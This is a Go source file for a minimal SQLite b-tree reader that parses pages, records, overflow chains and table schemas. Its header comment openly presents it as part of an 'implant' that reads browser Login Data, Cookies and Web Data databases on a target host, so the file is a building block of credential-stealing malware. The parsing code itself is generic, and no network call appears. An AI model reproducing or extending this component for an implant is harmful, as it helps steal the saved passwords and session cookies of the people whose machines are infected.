// Package sqlread is a minimal, dependency-free read-only SQLite b-tree reader.
//
// The implant needs Login Data / Cookies / Web Data rows on the target host,
// because that is where the DPAPI / Keychain / secret-service context lives.
// CGO is off for every implant build and a full driver is far more code than
// this needs, so this package walks table b-trees directly.
//
// Scope and limits, on purpose:
//   - table b-trees only (no indexes needed here), rowid tables
//   - text/int/real/blob/null serial types, int 0/1 shortcuts, overflow chains
//   - WAL is NOT merged: a database whose newest commits still sit in the -wal
//     file will read as of its last checkpoint. Callers that care copy the
//     main file after the browser exits, or accept a slightly stale view.
//   - no schema validation beyond CREATE TABLE column extraction
package sqlread

import (
	"encoding/binary"
	"errors"
	"fmt"
	"math"
	"strings"
)

var (
	ErrNotSQLite   = errors.New("not a sqlite3 database")
	ErrCorrupt     = errors.New("corrupt sqlite file")
	ErrNoTable     = errors.New("table not found")
	ErrUnsupported = errors.New("unsupported sqlite feature")
)

const (
	pageLeafTable     = 0x0D
	pageInteriorTable = 0x05
	offsetMagic       = 100 // b-tree header of page 1 starts after the file header
)

type DB struct {
	data     []byte
	pageSize int
	usable   int
}

// Open validates the header and returns a reader over the raw file bytes. The
// caller owns data and must not mutate it while reading.
func Open(data []byte) (*DB, error) {
	if len(data) < 512 || string(data[:16]) != "SQLite format 3\x00" {
		return nil, ErrNotSQLite
	}
	ps := int(binary.BigEndian.Uint16(data[16:18]))
	if ps == 1 {
		ps = 65536
	}
	if ps < 512 || ps > 65536 || ps&(ps-1) != 0 {
		return nil, fmt.Errorf("%w: page size %d", ErrCorrupt, ps)
	}
	if len(data) < ps {
		return nil, ErrCorrupt
	}
	reserved := int(data[20])
	usable := ps - reserved
	if usable < 480 {
		return nil, fmt.Errorf("%w: usable size %d", ErrCorrupt, usable)
	}
	return &DB{data: data, pageSize: ps, usable: usable}, nil
}

// PageSize reports the database page size in bytes.
func (d *DB) PageSize() int { return d.pageSize }

// Value is one decoded column value.
type Value struct {
	Kind Kind
	Int  int64
	Real float64
	Text string
	Blob []byte
}

type Kind uint8

const (
	Null Kind = iota
	Integer
	Float
	Text
	Blob
)

func (v Value) IsNull() bool { return v.Kind == Null }

// String renders the value for logging and TSV output.
func (v Value) String() string {
	switch v.Kind {
	case Null:
		return ""
	case Integer:
		return fmt.Sprintf("%d", v.Int)
	case Float:
		return fmt.Sprintf("%g", v.Real)
	case Text:
		return v.Text
	case Blob:
		return string(v.Blob)
	}
	return ""
}

// Bytes returns raw bytes for blob cells and the UTF-8 bytes for text cells.
func (v Value) Bytes() []byte {
	if v.Kind == Blob {
		return v.Blob
	}
	if v.Kind == Text {
		return []byte(v.Text)
	}
	return nil
}

// Table is a located table b-tree with its column names.
type Table struct {
	db      *DB
	Name    string
	Columns []string
	root    int
	// aliasIdx is the column declared "INTEGER PRIMARY KEY", which sqlite
	// stores as NULL in the record because it is an alias for the rowid.
	// Scan fills it from the b-tree key instead of returning NULL.
	aliasIdx int
}

// Table locates a table by name through sqlite_master and extracts its column
// order from the stored CREATE TABLE statement.
func (d *DB) Table(name string) (*Table, error) {
	var found *Table
	err := d.scanRoot(1, 0, func(rowid int64, vals []Value) bool {
		if len(vals) < 5 {
			return true
		}
		if strings.EqualFold(vals[0].String(), "table") && strings.EqualFold(vals[1].String(), name) {
			root := int(vals[3].Int)
			if root <= 0 {
				return true
			}
			cols, alias := parseColumns(vals[4].String())
			found = &Table{
				db:       d,
				Name:     vals[1].String(),
				Columns:  cols,
				root:     root,
				aliasIdx: alias,
			}
			return false
		}
		return true
	})
	if err != nil {
		return nil, err
	}
	if found == nil {
		return nil, fmt.Errorf("%w: %s", ErrNoTable, name)
	}
	return found, nil
}

// Tables lists every user table name, useful for diagnostics.
func (d *DB) Tables() ([]string, error) {
	var out []string
	err := d.scanRoot(1, 0, func(rowid int64, vals []Value) bool {
		if len(vals) >= 2 && strings.EqualFold(vals[0].String(), "table") {
			out = append(out, vals[1].String())
		}
		return true
	})
	return out, err
}

// Scan walks rows in rowid order and hands each row to fn as a name->value map.
// Returning false from fn stops the walk. limit <= 0 means no limit.
func (t *Table) Scan(limit int, fn func(row map[string]Value) bool) error {
	n := 0
	return t.db.scanRoot(t.root, 0, func(rowid int64, vals []Value) bool {
		row := make(map[string]Value, len(t.Columns))
		for i, name := range t.Columns {
			if i < len(vals) {
				row[name] = vals[i]
			} else {
				row[name] = Value{Kind: Null}
			}
		}
		if t.aliasIdx >= 0 && t.aliasIdx < len(t.Columns) && row[t.Columns[t.aliasIdx]].Kind == Null {
			row[t.Columns[t.aliasIdx]] = Value{Kind: Integer, Int: rowid}
		}
		n++
		if limit > 0 && n > limit {
			return false
		}
		return fn(row)
	})
}

// Count reports how many rows the table has without decoding column payloads
// beyond what the b-tree walk needs.
func (t *Table) Count() (int, error) {
	n := 0
	err := t.db.scanRoot(t.root, 0, func(rowid int64, vals []Value) bool {
		n++
		return true
	})
	return n, err
}

// scanRoot walks a b-tree rooted at page, decoding table leaf rows.
func (d *DB) scanRoot(page int, depth int, fn func(rowid int64, vals []Value) bool) error {
	if depth > 64 || page <= 0 {
		return ErrCorrupt
	}
	if _, err := d.page(page); err != nil {
		return err
	}
	hdrType, nCells, ptrBase, rightMost, err := d.header(page)
	if err != nil {
		return err
	}
	switch hdrType {
	case pageInteriorTable:
		for i := 0; i < nCells; i++ {
			off := ptrBase + i*2
			if off+2 > len(d.data) {
				return ErrCorrupt
			}
			cellOff := int(binary.BigEndian.Uint16(d.data[off:]))
			cell := d.pageStart(page) + cellOff
			if cell+4 > len(d.data) {
				return ErrCorrupt
			}
			child := int(binary.BigEndian.Uint32(d.data[cell:]))
			if err := d.scanRoot(child, depth+1, fn); err != nil {
				return err
			}
		}
		// An interior table page carries N+1 children: the N left pointers in
		// the cells plus one right-most pointer in the header. Missing it drops
		// the whole right subtree.
		if rightMost > 0 {
			return d.scanRoot(rightMost, depth+1, fn)
		}
		return nil
	case pageLeafTable:
		for i := 0; i < nCells; i++ {
			off := ptrBase + i*2
			if off+2 > len(d.data) {
				return ErrCorrupt
			}
			cellOff := int(binary.BigEndian.Uint16(d.data[off:]))
			rowid, payload, err := d.leafPayload(page, cellOff)
			if err != nil {
				return err
			}
			vals, err := decodeRecord(payload)
			if err != nil {
				return err
			}
			if !fn(rowid, vals) {
				return nil
			}
		}
		return nil
	default:
		return fmt.Errorf("%w: page %d has type 0x%02x", ErrCorrupt, page, hdrType)
	}
}

func (d *DB) pageStart(page int) int { return (page - 1) * d.pageSize }

func (d *DB) page(page int) ([]byte, error) {
	start := d.pageStart(page)
	if start < 0 || start+d.pageSize > len(d.data) {
		return nil, fmt.Errorf("%w: page %d out of range", ErrCorrupt, page)
	}
	return d.data[start : start+d.pageSize], nil
}

// header returns the b-tree page type, cell count and the absolute offset of
// the cell pointer array.
func (d *DB) header(page int) (typ int, nCells int, ptrBase int, rightMost int, err error) {
	base := d.pageStart(page)
	if page == 1 {
		base += offsetMagic
	}
	if base+12 > len(d.data) {
		return 0, 0, 0, 0, ErrCorrupt
	}
	typ = int(d.data[base])
	switch typ {
	case pageLeafTable:
		if base+8 > len(d.data) {
			return 0, 0, 0, 0, ErrCorrupt
		}
		nCells = int(binary.BigEndian.Uint16(d.data[base+3:]))
		return typ, nCells, base + 8, 0, nil
	case pageInteriorTable:
		nCells = int(binary.BigEndian.Uint16(d.data[base+3:]))
		rightMost = int(binary.BigEndian.Uint32(d.data[base+8:]))
		return typ, nCells, base + 12, rightMost, nil
	default:
		return typ, 0, 0, 0, fmt.Errorf("%w: unsupported page type 0x%02x", ErrUnsupported, typ)
	}
}

// leafPayload decodes one table leaf cell: varint payload length, varint rowid,
// the payload (inline plus any overflow chain), honouring sqlite's local-size
// rules.
func (d *DB) leafPayload(page, cellOff int) (int64, []byte, error) {
	p := d.pageStart(page) + cellOff
	if p < 0 || p >= len(d.data) {
		return 0, nil, ErrCorrupt
	}
	n, n1, err := uvarint(d.data, p)
	if err != nil {
		return 0, nil, err
	}
	payloadLen := int(n)
	rowid, n2, err := svarint(d.data, p+n1)
	if err != nil {
		return 0, nil, err
	}
	body := p + n1 + n2
	if payloadLen < 0 || body >= len(d.data) {
		return 0, nil, ErrCorrupt
	}

	maxLocal := d.usable - 35
	minLocal := (d.usable-12)*32/255 - 23
	local := payloadLen
	spills := false
	if payloadLen > maxLocal {
		local = minLocal + (payloadLen-minLocal)%(d.usable-4)
		if local > maxLocal {
			local = minLocal
		}
		spills = true
	}
	if body+local > len(d.data) {
		return 0, nil, ErrCorrupt
	}
	payload := make([]byte, 0, payloadLen)
	payload = append(payload, d.data[body:body+local]...)
	if !spills {
		return rowid, payload, nil
	}
	if body+local+4 > len(d.data) {
		return 0, nil, ErrCorrupt
	}
	next := int(binary.BigEndian.Uint32(d.data[body+local:]))
	guard := 0
	for next > 0 {
		guard++
		if guard > 4096 {
			return 0, nil, ErrCorrupt
		}
		start := d.pageStart(next)
		if start < 0 || start+4 > len(d.data) {
			return 0, nil, ErrCorrupt
		}
		next = int(binary.BigEndian.Uint32(d.data[start:]))
		chunk := d.data[start+4:]
		if len(chunk) > d.usable-4 {
			chunk = chunk[:d.usable-4]
		}
		payload = append(payload, chunk...)
		if len(payload) >= payloadLen {
			break
		}
	}
	if len(payload) > payloadLen {
		payload = payload[:payloadLen]
	}
	return rowid, payload, nil
}

// decodeRecord splits a record payload into values using its serial type header.
func decodeRecord(rec []byte) ([]Value, error) {
	hdrLen, n, err := uvarint(rec, 0)
	if err != nil {
		return nil, err
	}
	if int(hdrLen) > len(rec) {
		return nil, ErrCorrupt
	}
	body := int(hdrLen)
	var vals []Value
	for pos := n; pos < int(hdrLen); {
		st, m, err := uvarint(rec, pos)
		if err != nil {
			return nil, err
		}
		pos += m
		v, used, err := decodeValue(rec, body, st)
		if err != nil {
			return nil, err
		}
		body += used
		vals = append(vals, v)
	}
	return vals, nil
}

func decodeValue(rec []byte, off int, st uint64) (Value, int, error) {
	switch st {
	case 0:
		return Value{Kind: Null}, 0, nil
	case 1, 2, 3, 4, 5, 6:
		size := []int{0, 1, 2, 3, 4, 6, 8}[st]
		if off+size > len(rec) {
			return Value{}, 0, ErrCorrupt
		}
		var v int64
		for i := 0; i < size; i++ {
			v = v<<8 | int64(rec[off+i])
		}
		shift := uint(64 - 8*size)
		v = v << shift >> shift // sign extend
		return Value{Kind: Integer, Int: v}, size, nil
	case 7:
		if off+8 > len(rec) {
			return Value{}, 0, ErrCorrupt
		}
		bits := binary.BigEndian.Uint64(rec[off:])
		return Value{Kind: Float, Real: math.Float64frombits(bits)}, 8, nil
	case 8:
		return Value{Kind: Integer, Int: 0}, 0, nil
	case 9:
		return Value{Kind: Integer, Int: 1}, 0, nil
	case 10, 11:
		return Value{Kind: Null}, 0, nil
	}
	if st%2 == 0 {
		size := int(st-12) / 2
		if off+size > len(rec) {
			return Value{}, 0, ErrCorrupt
		}
		blob := make([]byte, size)
		copy(blob, rec[off:off+size])
		return Value{Kind: Blob, Blob: blob}, size, nil
	}
	size := int(st-13) / 2
	if off+size > len(rec) {
		return Value{}, 0, ErrCorrupt
	}
	return Value{Kind: Text, Text: string(rec[off : off+size])}, size, nil
}

func uvarint(b []byte, off int) (uint64, int, error) {
	var v uint64
	for i := 0; i < 9; i++ {
		if off+i >= len(b) {
			return 0, 0, ErrCorrupt
		}
		c := b[off+i]
		if i == 8 {
			v = v<<8 | uint64(c)
			return v, 9, nil
		}
		v = v<<7 | uint64(c&0x7f)
		if c&0x80 == 0 {
			return v, i + 1, nil
		}
	}
	return 0, 0, ErrCorrupt
}

func svarint(b []byte, off int) (int64, int, error) {
	v, n, err := uvarint(b, off)
	if err != nil {
		return 0, 0, err
	}
	// sqlite stores rowids as two's complement; the readers here only need
	// monotonic ordering, so reinterpret with the same width.
	return int64(v), n, nil
}

// parseColumns extracts column names from a CREATE TABLE statement, plus the
// index of the column that aliases the rowid ("INTEGER PRIMARY KEY"). It is
// deliberately forgiving: table constraints and anything that is not a plain
// "name type" pair are skipped rather than rejected.
func parseColumns(create string) ([]string, int) {
	open := strings.IndexByte(create, '(')
	if open < 0 {
		return nil, -1
	}
	var parts []string
	depth := 0
	start := open + 1
	inStr := byte(0)
	for i := open + 1; i < len(create); i++ {
		c := create[i]
		if inStr != 0 {
			if c == inStr {
				inStr = 0
			}
			continue
		}
		switch c {
		case '\'', '"', '`':
			inStr = c
		case '(':
			depth++
		case ')':
			if depth == 0 {
				parts = append(parts, create[start:i])
				i = len(create)
				continue
			}
			depth--
		case ',':
			if depth == 0 {
				parts = append(parts, create[start:i])
				start = i + 1
			}
		}
	}
	var cols []string
	alias := -1
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		up := strings.ToUpper(p)
		skip := false
		for _, kw := range []string{"CONSTRAINT ", "PRIMARY ", "UNIQUE ", "CHECK ", "FOREIGN ", "WITHOUT"} {
			if strings.HasPrefix(up, kw) {
				skip = true
				break
			}
		}
		if skip {
			continue
		}
		name := columnName(p)
		if name == "" {
			continue
		}
		if alias < 0 && isRowIDAlias(p, name) {
			alias = len(cols)
		}
		cols = append(cols, name)
	}
	return cols, alias
}

// isRowIDAlias reports whether one column definition declares "INTEGER PRIMARY
// KEY", the only form sqlite treats as an alias for the rowid.
func isRowIDAlias(def, name string) bool {
	rest := strings.TrimSpace(def[len(name):])
	fields := strings.Fields(strings.ToUpper(rest))
	if len(fields) < 3 {
		return false
	}
	return fields[0] == "INTEGER" && fields[1] == "PRIMARY" && strings.HasPrefix(fields[2], "KEY")
}

// columnName pulls the identifier out of one column definition, honouring the
// four sqlite quoting styles: "double", `backtick`, [bracket] and 'single'.
func columnName(def string) string {
	def = strings.TrimSpace(def)
	if def == "" {
		return ""
	}
	switch def[0] {
	case '"', '`', '\'':
		q := def[0]
		if end := strings.IndexByte(def[1:], q); end >= 0 {
			return def[1 : 1+end]
		}
		return strings.Trim(def, string(q))
	case '[':
		if end := strings.IndexByte(def, ']'); end > 0 {
			return def[1:end]
		}
		return strings.Trim(def, "[]")
	}
	for i, r := range def {
		if r == ' ' || r == '\t' || r == '(' || r == '\n' || r == '\r' {
			return def[:i]
		}
	}
	return def
}
